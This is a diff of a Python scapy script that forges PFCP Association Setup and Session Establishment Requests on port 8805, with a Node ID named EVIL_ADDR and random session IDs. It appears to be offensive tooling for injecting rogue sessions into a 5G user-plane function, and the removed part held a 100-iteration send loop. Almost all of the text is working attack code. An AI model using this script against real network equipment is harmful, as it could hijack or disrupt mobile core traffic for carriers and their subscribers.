@@ -7,13 +7,17 @@ DEST_PORT = 8805
 SRC_PORT = 8805
 seq=1
 
+# Generates a random SEID
 def random_seid():
     return random.randint(1, 0xFFFFFFFFFFFFFFFF)
 
+# Send PFCP Association Setup Request
 def send_pfcp_association_setup_req():
     global seq
     
-
+    # Trick to bypass scapy's bad parsing
+    
+    
     node_id = Raw(bytes(IE_NodeId(id_type=0, ipv4=EVIL_ADDR)))
     recovery_timestamp = Raw(bytes(IE_RecoveryTimeStamp(
         timestamp=int(time.time())
@@ -48,7 +52,7 @@ def send_pfcp_session_establishment_req(seid=0xC0FFEE):
         IE_Precedence(precedence=255),
         IE_PDI(IE_list=[
             IE_SourceInterface(interface=1),
-            #IE_NetworkInstance(instance=network_instance),
+            
             IE_FTEID(TEID=teid, V4=1, ipv4=ue_ip)
         ]),
         IE_FAR_Id(id=1)
@@ -56,10 +60,7 @@ def send_pfcp_session_establishment_req(seid=0xC0FFEE):
 
     ie_createfar = Raw(bytes(IE_CreateFAR(IE_list=[
         IE_FAR_Id(id=1),
-        IE_ApplyAction(FORW=1),
-        #IE_ForwardingParameters(IE_list=[
-        #    IE_DestinationInterface(interface=1)
-        #])
+        IE_ApplyAction(FORW=1)
     ])))
 
     pfcp_msg = PFCP(
@@ -79,12 +80,3 @@ def send_pfcp_session_establishment_req(seid=0xC0FFEE):
     print("Packet sent.")
     seq += 1
 
-
-
-for x in range(100):
-    send_pfcp_association_setup_req()
-    time.sleep(0.1)
-    send_pfcp_session_establishment_req(random_seid())
-    time.sleep(0.1)
-
-    
